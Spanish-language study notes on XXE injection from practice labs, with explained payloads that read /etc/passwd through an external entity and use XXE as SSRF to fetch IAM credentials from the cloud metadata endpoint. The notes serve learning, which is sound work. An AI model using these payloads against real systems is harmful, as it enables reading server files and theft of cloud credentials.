# Notas - Día 2 XXE Injection
# Fecha: 01/07/2026

## Objetivo del día

Aprender cómo funciona XXE Injection y entender cómo un servidor puede leer archivos o consultar recursos internos mediante XML mal procesado.

## Lo que entendí

XXE ocurre cuando una aplicación recibe XML y el parser permite usar `DOCTYPE` y entidades externas.

Una entidad es como una variable dentro del XML.
Por ejemplo, puedo crear una entidad llamada `xxe` y luego llamarla con `&xxe;`.

## Lab 1 - Leer archivo local

En el primer laboratorio usé XXE para leer el archivo `/etc/passwd`.

Payload usado:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

## Explicación del payload

`<?xml version="1.0" encoding="UTF-8"?>` declara que el documento es XML.

`<!DOCTYPE stockCheck [` abre una sección donde se pueden declarar entidades.

`<!ENTITY xxe SYSTEM "file:///etc/passwd">` crea una entidad llamada `xxe` que apunta al archivo `/etc/passwd` del servidor.

`&xxe;` llama a la entidad, y el parser reemplaza eso por el contenido del archivo.

## Lab 2 - XXE usado como SSRF

También resolví un laboratorio donde XXE no apuntaba a un archivo local, sino a una URL interna del servidor.

Payload usado:

```xml
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
```

Luego llamé la entidad dentro de `productId`:

```xml
<productId>&xxe;</productId>
```

La aplicación esperaba un número de producto, pero recibió la respuesta del endpoint interno.
Por eso devolvió un error mostrando información sensible.

## Qué aprendí

Aprendí que XXE no solo sirve para leer archivos con `file://`.

También puede usarse para hacer que el servidor consulte URLs internas, parecido a SSRF.

La diferencia sería:

* SSRF: uso un parámetro URL para que el servidor haga una petición.
* XXE: uso una entidad XML externa para que el parser haga una petición o lea un archivo.

## Dudas o errores que tuve

Al principio no entendía bien qué hacía `DOCTYPE`.

Después entendí que sirve para declarar reglas o entidades dentro del XML.

También me confundí con `file:///etc/passwd`, pero ahora entiendo que `file://` es el esquema y `/etc/passwd` es la ruta absoluta del archivo.

## Qué debo practicar más

* Leer mejor estructuras XML.
* Reconocer cuándo una petición usa XML.
* Practicar más labs donde XXE se use para leer archivos o consultar servicios internos.
* Tapar siempre cookies, tokens y credenciales antes de subir evidencias.
